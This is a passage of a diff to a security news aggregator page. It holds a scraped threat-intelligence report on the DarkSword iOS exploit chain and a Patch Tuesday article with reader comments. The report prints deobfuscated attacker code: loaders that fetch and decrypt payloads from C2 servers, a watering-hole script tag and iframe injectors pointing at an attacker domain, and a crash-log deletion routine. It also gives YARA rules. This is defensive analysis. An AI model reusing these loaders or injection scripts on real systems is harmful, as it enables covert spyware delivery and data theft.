+_0x1fedd2.open('POST', 'https://<redacted>' + (_0x12fba8 + '?' + Date.now()), false);
+_0x1fedd2.setRequestHeader('Content-Type', 'application/json');
+_0x1fedd2.send(JSON.stringify(_0x119092));
+if (_0x1fedd2.status === 0xc8) {
+const _0x362968 = JSON.parse(_0x1fedd2.responseText);
+const _0x32efb2 = _0x362968.a;
+const _0x46ca4b = _0x362968.b;
+const _0xfae3b8 = b64toUint8Array(_0x32efb2);
+const _0x2f4536 = b64toUint8Array(_0x46ca4b);
+const _0xa36b4f = deriveAesKey(_0x35744f.privateKey, _0x2f4536);
+const _0x36e338 = decryptData(_0xfae3b8, _0xa36b4f);
+const _0x50186a = new TextDecoder().decode(_0x36e338);
+return _0x50186a;
+}
+return null;
+}
+Figure 11: Deobfuscated getJS()
+snippet from the DarkSword loader (PARS Defense, November 2025)
+let workerCode = '';
+if (ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2' || ios_version == '18,7') {
+workerCode = getJS('6cde159c.js?' + Date.now());
+} else {
+workerCode = getJS('a9bc5c66.js?' + Date.now());
+}
+let workerBlob = new Blob([workerCode], {
+'type': 'text/javascript'
+});
+let workerBlobUrl = URL.createObjectURL(workerBlob);
+Figure 12: Deobfuscated snippet for loading the RCE workers (PARS Defense, November 2025)
+if (!sessionStorage.getItem('uid') && canUseApplePay() && "standalone" in navigator && (CSS.supports("backdrop-filter: blur(10px)") || CSS.supports("-webkit-backdrop-filter: blur(10px)")) && document.pictureInPictureEnabled && !(typeof window.chrome === "object" && window.chrome !== null) && !('InstallTrigger' in window) && supportsWebGL2() && getDeviceInputInfo() && !("vibrate" in navigator) && debuggerCheck()) {
+(() => {
+function _0x45e723(_0x52731a) {
+const _0x43f8d9 = generateKeyPair();
+const _0x427066 = exportPublicKeyAsPem(_0x43f8d9.publicKey);
+const _0x5cfee7 = self.btoa(_0x427066);
+const _0x96910f = {
+'a': _0x5cfee7
+};
+_0x52731a = _0x52731a.startsWith('/') ? _0x52731a : '/' + _0x52731a;
+const _0x436cc4 = new XMLHttpRequest();
+_0x436cc4.open("POST", 'https://<redacted>' + (_0x52731a + '?' + Date.now()), false);
+_0x436cc4.setRequestHeader('Content-Type', "application/json");
+_0x436cc4.send(JSON.stringify(_0x96910f));
+if (_0x436cc4.status === 0xc8) {
+const _0x4a4193 = JSON.parse(_0x436cc4.responseText);
+const _0x362b30 = _0x4a4193.a;
+const _0x536004 = _0x4a4193.b;
+const _0x183b3f = b64toUint8Array(_0x362b30);
+const _0x46bbee = b64toUint8Array(_0x536004);
+const _0x43e600 = deriveAesKey(_0x43f8d9.privateKey, _0x46bbee);
+const _0x2e0735 = decryptData(_0x183b3f, _0x43e600);
+const _0x26a8b1 = new TextDecoder().decode(_0x2e0735);
+return _0x26a8b1;
+}
+return null;
+}
+let _0x100ce6 = _0x45e723('6297d177.html?' + Math.random());
+const _0x5f5a7d = document.createElement("iframe");
+_0x5f5a7d.srcdoc = _0x100ce6;
+_0x5f5a7d.style.height = 0x0;
+_0x5f5a7d.style.width = 0x0;
+_0x5f5a7d.style.border = 'none';
+document.body.appendChild(_0x5f5a7d);
+})();
+} else {
+top.location.href = "<legit website>";
+window.location.href = '<legit website>';
+}
+Figure 13: Deobfuscated landing page snippet to fetch the DarkSword loader (PARS Defense, January 2026)
+GHOSTSABER
+GHOSTSABER is a JavaScript backdoor used by PARS Defense that communicates with its C2 server over HTTP(S). Its capabilities include device and account enumeration, file listing, data exfiltration, and the execution of arbitrary JavaScript code; a complete list of its supported commands is detailed in Table 1. Observed GHOSTSABER samples contain references to several commands that lack the necessary code to be executed, including some that purport to record audio from the device's microphone and send the device's current geolocation to the C2 server. These commands use a function called send_command_to_upper_process
+, which writes to a shared memory region that is otherwise unused in the implant. We suspect that a follow-on binary module may be downloaded from the C2 server to implement these commands at runtime.
+New Ukrainian Watering Hole Activity From UNC6353
+GTIG observed the suspected Russian espionage actor UNC6353 leveraging DarkSword in a new watering hole campaign targeting Ukrainian users. As mentioned in our recent [blog post](https://cloud.google.com/blog/topics/threat-intelligence/coruna-powerful-ios-exploit-kit), we first began tracking UNC6353 in summer 2025 as a threat cluster conducting watering hole attacks on Ukrainian websites to deliver Coruna. This new activity, which has been active through March 2026 but dates back to at least December 2025, leverages the DarkSword exploit chain to deploy GHOSTBLADE. GTIG notified and collaborated with CERT-UA to mitigate this activity.
+Compromised Ukrainian websites were updated to include a malicious script
+tag that fetched the first delivery stage from an UNC6353 server, static.cdncounter[.]net
+(Figure 14). This script (Figure 15) dynamically creates a new IFrame and sets its source to a file called index.html
+on the same server (Figure 16). While index.html
+bears some overlap with the landing page logic used by UNC6748 and PARS Defense, it sets the uid
+session storage key without checking the session's current state, and includes a Russian language comment that translates to "if uid is still needed, just install it."
+Notably, the observed UNC6353 use of DarkSword only supported iOS 18.4-18.6. While earlier DarkSword use attributed to UNC6748 and PARS Defense also supported iOS 18.7, we did not observe that from UNC6353, despite their later operational timeline. However, the loader used in this version correctly loaded the RCE modules corresponding to the running iOS version, which we didn't observe in UNC6748's use of DarkSword with only iOS 18.4-18.6 support (Figure 17).
+<script async src="https://static.cdncounter.net/widgets.js?uhfiu27fajf2948fjfefaa42"></script>
+Figure 14: Malicious script
+tag used by UNC6353 (March 2026)
+(function () {
+const iframe = document.createElement("iframe");
+iframe.src = "https://static.cdncounter.net/assets/index.html";
+iframe.style.width = "1px";
+iframe.style.height = "1px";
+iframe.style.border = "0";
+iframe.style.position = "absolute";
+iframe.style.left = "-9999px";
+iframe.style.opacity = "0.01";
+// важно для Safari
+iframe.setAttribute(
+"sandbox",
+"allow-scripts allow-same-origin"
+);
+document.body.appendChild(iframe);
+})();
+Figure 15: widgets.js
+(UNC6353, March 2026)
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Test Page</title>
+</head>
+<body>
+<script>
+// если uid всё ещё нужен — просто устанавливаем
+sessionStorage.setItem('uid', '1');
+const frame = document.createElement('iframe');
+frame.src = 'frame.html?' + Math.random();
+frame.style.width = '1px';
+frame.style.opacity = '0.01'
+frame.style.position = 'absolute';
+frame.style.left = '-9999px';
+frame.style.height = '1px';
+frame.style.border = 'none';
+document.body.appendChild(frame);
+</script>
+</body>
+</html>
+Figure 16: index.html
+(UNC6353, March 2026)
+let workerCode = "";
+if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
+workerCode = getJS(`rce_worker_18.6.js?${Date.now()}`); // local version
+else
+workerCode = getJS(`rce_worker_18.4.js?${Date.now()}`); // local version
+let workerBlob = new Blob([workerCode],{type:'text/javascript'});
+let workerBlobUrl = URL.createObjectURL(workerBlob);
+Figure 17: rce_loader.js
+snippet for loading the RCE exploit workers (UNC6353, March 2026)
+GHOSTBLADE
+Following device infections from these watering holes, UNC6353 deployed a malware family GTIG tracks as GHOSTBLADE. GHOSTBLADE is a dataminer written in JavaScript that collects and exfiltrates a wide variety of data from a compromised device (Table 2). Data collected by GHOSTBLADE is exfiltrated to an attacker-controlled server over HTTP(S). Unlike GHOSTKNIFE and GHOSTSABER, GHOSTBLADE is less capable and does not support any additional modules or backdoor-like functionality; it also does not operate continuously. However, similar to GHOSTKNIFE, GHOSTBLADE also contains code to delete crash reports, but targets a different directory where they may be stored (Figure 18). The GHOSTBLADE sample observed in this activity had full debug logging present along with lots of comments in the code.
+Notably, the GHOSTBLADE sample analyzed by GTIG contains a comment and code block conditionally executing code on iOS versions greater than or equal to 18.4, which is the minimum supported version by DarkSword (Figure 19; note that ver
+is parsed from uname
+, which returns the XNU version). This suggests the payload also supports running on versions lower than 18.4, which isn't supported by DarkSword.
+static deleteCrashReports()
+{
+this.getTokenForPath("/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.osanalytics/DiagnosticReports/",true);
+libs_JSUtils_FileUtils__WEBPACK_IMPORTED_MODULE_0__["default"].deleteDir("/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.osanalytics/DiagnosticReports/",true);
+}
+Figure 18: GHOSTBLADE code snippet used for deleting crash logs
+// If iOS >= 18.4 we apply migbypass in order to bypass autobox restrictions
+if (ver.major == 24 && ver.minor >= 4) {
+mutexPtr = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("malloc", 0x100));
+libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("pthread_mutex_init", mutexPtr, null);
+migFilterBypass = new MigFilterBypass(mutexPtr);
+}
+Figure 19: Code conditionally executed on iOS 18.4+ in GHOSTBLADE
+DarkSword Exploit Chain
+As mentioned, DarkSword uses six different vulnerabilities to fully compromise a vulnerable iOS device and run a final payload with full kernel privileges (Table 3). Unlike Coruna, DarkSword only supports a limited set of iOS versions (18.4-18.7), and while the different exploit stages are technically sophisticated, the mechanisms used for loading the exploits were more basic and less robust than Coruna.
+Also unlike Coruna, DarkSword uses pure JavaScript for all stages of the exploit chain and final payloads. While more sophistication is required to bridge between JavaScript and the native APIs and IPC channels used in the exploit, its use eliminates the need to identify vulnerabilities for bypassing [Page Protection Layer (PPL)](https://support.apple.com/guide/security/operating-system-integrity-sec8b776536b/1/web/1#sec314c3af61) or [Secure Page Table Monitor (SPTM)](https://support.apple.com/guide/security/operating-system-integrity-sec8b776536b/1/web/1#secd022396fb) exploit mitigations in iOS that prevent unsigned binary code from being executed.
+Figure 20: DarkSword infection chain
+Exploit Delivery
+There are notable similarities and differences between the exploit delivery implementations used by UNC6748, PARS Defense, and UNC6353. We assess that each of the actors built their delivery mechanisms on a base set of logic from the DarkSword developers, and made tweaks to fit their own needs. All three actors had some usage of the uid
+session storage key, but not all in the same way:
+-
+We consistently saw UNC6748 landing pages both set the
+uid
+key, and check it before fetching the exploit loader. -
+UNC6748 only set the
+top.location.href
+property to redirect users if they weren't to be infected. -
+PARS Defense used the
+uid
+key in the same way in January 2026, but the initial activity we saw in November 2025 didn't include it. -
+Like UNC6748, PARS Defense set
+top.location.href
+, but also setwindow.location.href
+to the same value. -
+UNC6353 set the
+uid
+key, but did not check it before fetching the exploit loader; a comment in the source code suggests that they did not know if it was required by the subsequent stages.
+Based on the actors' differing usages, we assess that this session storage check logic, along with the subsequent logic using frame.html
+to then fetch rce_loader.js
+as observed from UNC6748 and UNC6353, was developed by the DarkSword exploit chain developers. We assess that the additional fingerprinting logic used by PARS Defense in January 2026 and the anti-debug logic used by UNC6748 in November 2025 were likely written by those users to better meet their operational requirements.
+Loader
+All the activity we observed used effectively the same exploit loader, with some minor differences such as PARS Defense's addition of encryption. The loader manages Web Worker objects that are used by the two RCE exploits, along with state transitions throughout the RCE exploit lifecycle. The loader fetches two files for the RCE stages, named variations of rce_module.js
+and rce_worker.js
+(e.g. rce_worker_18.4.js
+). The iOS 18.4 exploit splits the logic between the Web Worker script and the main module, which is eval
+'d in the same context as the loader; the two different contexts communicate using postMessage
+as the RCE exploit progresses. The iOS 18.6/18.7 RCE exploit, however, contains all of the exploit logic in the worker, and the corresponding rce_module.js
+file just has an unused placeholder function (Figure 21).
+The inconsistencies surrounding the correctness of fetching the RCE stages by the loader module are intriguing. One possibility is that the errors were manually corrected by UNC6353 and PARS Defense; alternatively, it is possible that UNC6748 received the exploit chain updates prior to the other users, and the DarkSword developers subsequently fixed those bugs.
+// for displaying hex value
+function dummyy(x) {
+return '0x' + x.toString(16);
+}
+Figure 21: rce_module_18.7.js
+contents (UNC6748, November 2025)
+Remote Code Execution Exploits
+GTIG observed two different JavaScriptCore (the JavaScript engine used in WebKit and Apple's Safari browser) vulnerabilities exploited for remote code execution by DarkSword. For devices running versions of iOS prior to 18.6, DarkSword uses CVE-2025-31277, a JIT optimization/type confusion bug which was patched by Apple in iOS 18.6. For devices running iOS 18.6-18.7, DarkSword uses CVE-2025-43529, a garbage collection bug in the Data Flow Graph (DFG) JIT layer of JavaScriptCore which was patched by Apple in iOS 18.7.3 and 26.2 after it was reported by GTIG. Both exploits develop their own fakeobj
+/addrof
+primitives, and then build arbitrary read/write primitives the same way on top of them.
+Both vulnerabilities were directly chained with CVE-2026-20700, a bug in dyld
+used as a user-mode [Pointer Authentication Codes (PAC)](https://support.apple.com/guide/security/operating-system-integrity-sec8b776536b/1/web/1#sec0167b469d) bypass to execute arbitrary code, as required by the subsequent exploit stages. This vulnerability was patched by Apple in iOS 26.3 after being reported by GTIG.
+Sandbox Escape Exploits
+Safari is designed to use multiple sandbox layers to isolate the different components of the browser where untrusted user input may be handled. DarkSword uses two separate sandbox escape vulnerabilities, first by pivoting out of the WebContent sandbox into the GPU process, and then by pivoting from the GPU process to mediaplaybackd
+. The same sandbox escape exploits were used regardless of which RCE exploit was needed.
+WebContent Sandbox Escape
+As previously discussed by [Project Zero](https://projectzero.google/2023/10/an-analysis-of-an-in-the-wild-ios-safari-sandbox-escape.html) and others, Safari's renderer process (known as WebContent) is tightly sandboxed to limit the blast radius of any vulnerabilities it may contain, since it is the most accessible to untrusted user content. To bypass this, DarkSword fetches an exploit called sbox0_main_18.4.js
+or sbx0_main.js
+to break out of the WebContent sandbox. This exploit leverages CVE-2025-14174, a vulnerability in ANGLE where parameters were not sufficiently validated in a specific WebGL operation, leading to out-of-bounds memory operations in Safari's GPU process which the DarkSword developers use to execute arbitrary code within the GPU process.
+This vulnerability was reported to Google (the developers of ANGLE) by Apple and GTIG, and was patched in Safari with the release of iOS 18.7.3 and 26.2.
+GPU Sandbox Escape
+In Safari, the GPU process has more privileges than the WebContent sandbox, but still is restricted from accessing much of the rest of the system. To bypass this limitation, DarkSword uses another sandbox escape exploit, sbx1_main.js
+, which leverages CVE-2025-43510, a memory management vulnerability in XNU. This is a copy-on-write bug which is exploited to build arbitrary function call primitives in mediaplaybackd
+, a system service with a larger set of permissions than the Safari GPU process where they can run the final exploit needed. They do this by loading a copy of the JavaScriptCore runtime into the mediaplaybackd
+process, and executing the next stage exploit within it.
+This vulnerability was patched by Apple in iOS 18.7.2 and 26.1.
+Local Privilege Escalation and Final Payload
+Finally, the exploit loaded one last module, pe_main.js
+. This uses CVE-2025-43520, a kernel-mode race condition in XNU's virtual filesystem (VFS) implementation, which can be exploited to build physical and virtual memory read/write primitives. This vulnerability was patched by Apple in iOS 18.7.2 and 26.1.
+The exploit contains a suite of library classes building on top of their primitives that are used by the different post-exploitation payloads, such as Native
+, which provides abstractions for manipulating raw memory and calling native functions, and FileUtils
+, which provides a POSIX-like filesystem API. Artifacts left behind from the Webpack process applied to the analyzed GHOSTBLADE sample included file paths that show the structure on disk of these libraries (Figure 22).
+We assess that GHOSTBLADE was likely developed by the DarkSword developers, based on the consistency in coding styles and the tight integration between it and the library code, which is notably distinct from how GHOSTKNIFE and GHOSTSABER leveraged these libraries. We also observed additional modifications made to some of the post-exploitation payload libraries in the samples observed from PARS Defense, including additional raw memory buffer manipulation, likely used in follow-on binary modules. Additionally, the libraries in GHOSTBLADE contained a reference to a function called startSandworm()
+which was not implemented within it; we suspect this may be a codename for a different exploit.
+src/InjectJS.js
+src/libs/Chain/Chain.js
+src/libs/Chain/Native.js
+src/libs/Chain/OffsetsStruct.js
+src/libs/Driver/Driver.js
+src/libs/Driver/DriverNewThread.js
+src/libs/Driver/Offsets.js
+src/libs/Driver/OffsetsTable.js
+src/libs/JSUtils/FileUtils.js
+src/libs/JSUtils/Logger.js
+src/libs/JSUtils/Utils.js
+src/libs/TaskRop/Exception.js
+src/libs/TaskRop/ExceptionMessageStruct.js
+src/libs/TaskRop/ExceptionReplyStruct.js
+src/libs/TaskRop/MachMsgHeaderStruct.js
+src/libs/TaskRop/PAC.js
+src/libs/TaskRop/PortRightInserter.js
+src/libs/TaskRop/RegistersStruct.js
+src/libs/TaskRop/RemoteCall.js
+src/libs/TaskRop/Sandbox.js
+src/libs/TaskRop/SelfTaskStruct.js
+src/libs/TaskRop/Task.js
+src/libs/TaskRop/TaskRop.js
+src/libs/TaskRop/Thread.js
+src/libs/TaskRop/ThreadState.js
+src/libs/TaskRop/VM.js
+src/libs/TaskRop/VmMapEntry.js
+src/libs/TaskRop/VMObject.js
+src/libs/TaskRop/VmPackingParams.js
+src/libs/TaskRop/VMShmem.js
+src/loader.js
+src/main.js
+src/MigFilterBypassThread.js
+Figure 22: Filepath artifacts from GHOSTBLADE sample
+Outlook and Implications
+The use of both DarkSword and Coruna by a variety of actors demonstrates the ongoing risk of exploit proliferation across actors of varying geography and motivation. Google remains committed to aiding in the mitigation of this problem, in part through our ongoing participation in the [Pall Mall Process](https://www.gov.uk/government/publications/the-pall-mall-process-declaration-tackling-proliferation-and-irresponsible-use-of-commercial-cyber-intrusion-capabilities), designed to build consensus and progress toward limiting the harms from the spyware industry. Together, we are focused on developing international norms and frameworks to limit the misuse of these powerful technologies and protect human rights around the world. These efforts are built on earlier governmental actions, including [steps taken](https://www.federalregister.gov/documents/2023/03/30/2023-06730/prohibition-on-use-by-the-united-states-government-of-commercial-spyware-that-poses-risks-to) by the US Government to limit government use of spyware, and a [first-of-its-kind international](https://2021-2025.state.gov/joint-statement-on-efforts-to-counter-the-proliferation-and-misuse-of-commercial-spyware/) commitment to similar efforts.
+Acknowledgments
+We would like to acknowledge and thank Lookout, iVerify, [Google Project-Zero](http://projectzero.google/), and Apple Security Engineering & Architecture team for their partnership throughout this investigation.
+Indicators of Compromise (IOCs)
+To assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a [GTI Collection](https://www.virustotal.com/gui/collection/bd631d6c4cec1759bc298b8da180d9ed1d7d89475376bc614176c3541460f40c/summary) for registered users. We've also uploaded a sample of GHOSTBLADE to VirusTotal.
+Network Indicators
+File Indicators
+Detections
+YARA Rules
+rule G_Backdoor_GHOSTKNIFE_1 {
+meta:
+author = "Google Threat Intelligence Group (GTIG)"
+strings:
+$ = "server_pub_ex"
+$ = "client_pri_ds"
+$ = "getfilebyExtention"
+$ = "getContOfFilesForModule"
+$ = "carPlayConnectionState"
+$ = "saveRecordingApp"
+$ = "getLastItemBack"
+$ = "the inherted class"
+$ = "passExtetion"
+condition:
+filesize < 10MB and not (uint16be(0) == 0x504b or uint32be(0) == 0x6465780a or uint16be(0) == 0x4d5a or uint32be(0) == 0x377abcaf) and 4 of them
+}
+rule G_Backdoor_GHOSTSABER_1 {
+meta:
+author = "Google Threat Intelligence Group (GTIG)"
+strings:
+$ = "sendDeviceInfoJson"
+$ = "merge2AppLists"
+$ = "send_command_to_upper_process"
+$ = "ChangeStatusCheckSleepInterval"
+$ = "SendRegEx"
+$ = "evalJsResponse.json"
+$ = "sendSimpleUploadJsonObject"
+$ = "device_info_all"
+$ = "getPayloadForSimpleStatusRequest"
+condition:
+filesize < 10MB and not (uint16be(0) == 0x504b or uint32be(0) == 0x6465780a or uint16be(0) == 0x4d5a or uint32be(0) == 0x377abcaf) and 4 of them
+}
+rule G_Datamine_GHOSTBLADE_1 {
+meta:
+author = "Google Threat Intelligence Group (GTIG)"
+strings:
+$ = "/private/var/tmp/wifi_passwords.txt"
+$ = "/private/var/tmp/wifi_passwords_securityd.txt"
+$ = "/.com.apple.mobile_container_manager.metadata.plist" fullword
+$ = "X-Device-UUID: ${"
+$ = "/installed_apps.txt" fullword
+$ = "icloud_dump_" fullword
+condition:
+filesize < 10MB and not (uint16be(0) == 0x504b or uint32be(0) == 0x6465780a or uint16be(0) == 0x4d5a or uint32be(0) == 0x377abcaf) and 3 of them
+}
+rule G_Hunting_DarkSwordExploitChain_ImplantLib_FilePaths_1 {
+meta:
+author = "Google Threat Intelligence Group (GTIG)"
+strings:
+$ = "src/InjectJS.js"
+$ = "src/libs/Chain/Chain.js"
+$ = "src/libs/Chain/Native.js"
+$ = "src/libs/Chain/OffsetsStruct.js"
+$ = "src/libs/Driver/Driver.js"
+$ = "src/libs/Driver/DriverNewThread.js"
+$ = "src/libs/Driver/Offsets.js"
+$ = "src/libs/Driver/OffsetsTable.js"
+$ = "src/libs/JSUtils/FileUtils.js"
+$ = "src/libs/JSUtils/Logger.js"
+$ = "src/libs/JSUtils/Utils.js"
+$ = "src/libs/TaskRop/Exception.js"
+$ = "src/libs/TaskRop/ExceptionMessageStruct.js"
+$ = "src/libs/TaskRop/ExceptionReplyStruct.js"
+$ = "src/libs/TaskRop/MachMsgHeaderStruct.js"
+$ = "src/libs/TaskRop/PAC.js"
+$ = "src/libs/TaskRop/PortRightInserter.js"
+$ = "src/libs/TaskRop/RegistersStruct.js"
+$ = "src/libs/TaskRop/RemoteCall.js"
+$ = "src/libs/TaskRop/Sandbox.js"
+$ = "src/libs/TaskRop/SelfTaskStruct.js"
+$ = "src/libs/TaskRop/Task.js"
+$ = "src/libs/TaskRop/TaskRop.js"
+$ = "src/libs/TaskRop/Thread.js"
+$ = "src/libs/TaskRop/ThreadState.js"
+$ = "src/libs/TaskRop/VM.js"
+$ = "src/libs/TaskRop/VmMapEntry.js"
+$ = "src/libs/TaskRop/VMObject.js"
+$ = "src/libs/TaskRop/VmPackingParams.js"
+$ = "src/libs/TaskRop/VMShmem.js"
+$ = "src/MigFilterBypassThread.js"
+condition:
+any of them
+}</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
         </div>
         <div id="art-9" class="article-body">
-            <h2 style="color:#00FF00">>>> Wartime Usage of Compromised IP Cameras Highlight Their Danger</h2>
-            <p style="color:#666">Source: <a href="https://www.darkreading.com/cyber-risk/wartime-usage-of-compromised-ip-cameras-highlight-their-danger" target="_blank" style="color:#666;">https://www.darkreading.com/cyber-risk/wartime-usage-of-compromised-ip-cameras-highlight-their-danger</a></p>
-            <div class="content-text">The list of countries exploiting Internet-connected cameras to give them eyes inside their adversaries' borders continues to expand. What should companies look out for?
-
-[Full content could not be extracted. Visit source for details.]</div>
-            <button onclick="window.scrollTo(0,0)" style="margin-top:20px; color:#888; border:1px solid #444; padding:5px;">[↑ Back to Menu]</button>
-            <hr style="border:0; border-top:1px dashed #333; margin:40px 0;">
+            <h2 class="article-title">Microsoft Patch Tuesday, March 2026 Edition</h2>
+            <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/03/microsoft-patch-tuesday-march-2026-edition/" target="_blank">Original Link</a></p>
+            <div class="content-text">Microsoft Corp. today pushed security updates to fix at least 77 vulnerabilities in its Windows operating systems and other software. There are no pressing “zero-day” flaws this month (compared to February’s five zero-day treat), but as usual some patches may deserve more rapid attention from organizations using Windows. Here are a few highlights from this month’s Patch Tuesday.
+Two of the bugs Microsoft patched today were publicly disclosed previously. [CVE-2026-21262](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-21262) is a weakness that allows an attacker to elevate their privileges on SQL Server 2016 and later editions.
+“This isn’t just any elevation of privilege vulnerability, either; the advisory notes that an authorized attacker can elevate privileges to sysadmin over a network,” Rapid7’s Adam Barnett said. “The CVSS v3 base score of 8.8 is just below the threshold for critical severity, since low-level privileges are required. It would be a courageous defender who shrugged and deferred the patches for this one.”
+The other publicly disclosed flaw is [CVE-2026-26127](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-26127), a vulnerability in applications running on .NET. Barnett said the immediate impact of exploitation is likely limited to denial of service by triggering a crash, with the potential for other types of attacks during a service reboot.
+It would hardly be a proper Patch Tuesday without at least one critical Microsoft Office exploit, and this month doesn’t disappoint. [CVE-2026-26113](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-26113) and [CVE-2026-26110](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-26110) are both remote code execution flaws that can be triggered just by viewing a booby-trapped message in the Preview Pane.
+Satnam Narang at Tenable notes that just over half (55%) of all Patch Tuesday CVEs this month are privilege escalation bugs, and of those, a half dozen were rated “exploitation more likely” — across Windows Graphics Component, Windows Accessibility Infrastructure, Windows Kernel, Windows SMB Server and Winlogon. These include:
+–[CVE-2026-24291](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-24291): Incorrect permission assignments within the Windows Accessibility Infrastructure to reach SYSTEM (CVSS 7.8)
+–[CVE-2026-24294](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-24294): Improper authentication in the core SMB component (CVSS 7.8)
+–[CVE-2026-24289](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-24289): High-severity memory corruption and race condition flaw (CVSS 7.8)
+–[CVE-2026-25187](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-25187): Winlogon process weakness discovered by Google Project Zero (CVSS 7.8).
+Ben McCarthy, lead cyber security engineer at Immersive, called attention to [CVE-2026-21536](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-21536), a critical remote code execution bug in a component called the Microsoft Devices Pricing Program. Microsoft has already resolved the issue on their end, and fixing it requires no action on the part of Windows users. But McCarthy says it’s notable as one of the first vulnerabilities identified by an AI agent and officially recognized with a CVE attributed to the Windows operating system. It was discovered by XBOW, a fully autonomous AI penetration testing agent.
+XBOW has consistently ranked at or near the top of the Hacker One bug bounty leaderboard for the past year. McCarthy said CVE-2026-21536 demonstrates how AI agents can identify critical 9.8-rated vulnerabilities without access to source code.
+“Although Microsoft has already patched and mitigated the vulnerability, it highlights a shift toward AI-driven discovery of complex vulnerabilities at increasing speed,” McCarthy said. “This development suggests AI-assisted vulnerability research will play a growing role in the security landscape.”
+Microsoft earlier provided patches to address nine browser vulnerabilities, which are not included in the Patch Tuesday count above. In addition, Microsoft issued a crucial out-of-band (emergency) [update on March 2](https://support.microsoft.com/en-us/topic/march-2-2026-kb5082314-os-build-20348-4776-out-of-band-606518e5-28d2-4ebe-be25-26287e2fc703) for Windows Server 2022 to address a certificate renewal issue with passwordless authentication technology Windows Hello for Business.
+Separately, Adobe shipped updates to fix 80 vulnerabilities — some of them critical in severity — in [a variety of products](https://helpx.adobe.com/security/Home.html), including Acrobat and Adobe Commerce. Mozilla Firefox v. 148.0.2 resolves three high severity CVEs.
+For a complete breakdown of all the patches Microsoft released today, check out the SANS Internet Storm Center’s [Patch Tuesday post](https://isc.sans.edu/forums/diary/Microsoft%20Patch%20Tuesday%20March%202026/32782/). Windows enterprise admins who wish to stay abreast of any news about problematic updates, [AskWoody.com](https://www.askwoody.com) is always worth a visit. Please feel free to drop a comment below if you experience any issues apply this month’s patches.
+Contrary to this article, updates this month contain fixes for at least two publicly acknowledged zero days.
+Really? Which two? IDK how you define zero-day, but for me it’s an unpatched and actively exploited vulnerability. As mentioned in the story, there were two flaws fixed this month that were previously disclosed publicly. I believe in both cases there was not even sample exploit code involved.
+I’m just going off every other news outlet reporting. Bleeping computer, for example, stated “This month’s Patch Tuesday fixes two publicly disclosed zero-day vulnerabilities, with none of them known to be exploited in attacks. Microsoft classifies a zero-day flaw as publicly disclosed or actively exploited while no official fix is available.” ¯\_(ツ)_/¯
+Okay. Thanks for pointing that out. I wonder why Microsoft would call it zero-day when they’re not aware of exploitation; doesn’t seem to suit their interests to do so. I’ve always believed that calling bugs 0day just because someone detailed a vulnerability (without providing examples of how to exploit them) publicly is unnecessarily alarmist. Real zero-days are a call for greater urgency, IMHO.
+I think Microsoft likes to call them zero day when they feel the exploit is available even though nobody is currently using it. But then again maybe Microsoft knows something nobody else does? Is it one of those deals where it depends on who is releasing these security descriptors for the updates? One person calls them zero day the other something less dire? I saw the Bleeping Computer release too. They said the 2 zero-day ones were publicly disclosed. Not actively exploited. I guess sort of splitting hairs there.
+That sounds pretty accurate. I think “zero-day” is defined and communicated differently throughout different organizations. Technically, a zero-day is any vulnerability that was unknown to the vendor before it became public. That doesn’t necessarily mean it’s being actively exploited. Microsoft uses “zero-day” as a broad label, then clarifies whether it’s actively exploited or just publicly disclosed. Other sources, like BleepingComputer, tend to separate those more clearly, which can make things less confusing. A publicly disclosed zero-day increases risk, but an actively exploited one is far more urgent since attackers are already using it in real-world attacks.
+I don’t know if they know what they’re talking about, but Lifehacker reported there are two:
+https://lifehacker.com/tech/microsoft-patch-tuesday-march-2026#:~:text=Two%20publicly%20disclosed%20zero%2Ddays%20for%20this%20Patch%20Tuesday
+Looking for a patch for the chicken parm with panko and tagliatelle exploit. It’s two cascaded exploits, both leading to escalation followed by a ring three rk installation. 2021-2023/early 2024. Originating attacker from Ramat Gan.
+Gnarly beach.
+I had the same discussion with my coworker, who used CoPilot to summarize and the previously disclosed findings were included in the response because the patch is included in this month’s bundle. Strictly speaking anything previously published is no longer a “zero day” as far as I know, but it’s genesis stays with it.
+I mean, any bug, prior to being disclosed, is at some point a ‘zero-day’ bug. AFAIK, it ceases being an 0-day the minute it is disclosed, yah?
+Have they heard about two-factor authentication? They were obviously phished. Maybe put TFA in place now.
+Lol at the roughy in your article! You criminal mastermind, Keir!</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
         </div>
         <script>
             function show(id) {
@@ -235,7 +1233,13 @@ Iran Exploits Cyber Domain to Aid Kinetic Strikes
                 target.scrollIntoView({behavior: 'smooth'});
             }
         </script>
-        <p style="text-align:center; color:#444; margin-top:100px;">--- End of Data ---</p>
+        <footer>
+            <p>News aggregator designed and maintained by <a href="https://github.com/KleinMichalGit/security-feed" target="_blank">Michal Klein</a></p>
+            <div class="disclaimer">
+                <p>This is an <strong>open-source educational project</strong> intended for research and personal productivity. The aggregator is available on <a href="https://github.com/KleinMichalGit/security-feed" target="_blank">GitHub</a>.</p>
+                <p><em>Notice: The articles above are automated scrapes from third-party RSS feeds. Full credit belongs to the original authors and publications linked in each source. This site does not claim ownership of the reported content.</em></p>
+            </div>
+        </footer>
     </body>
     </html>
     
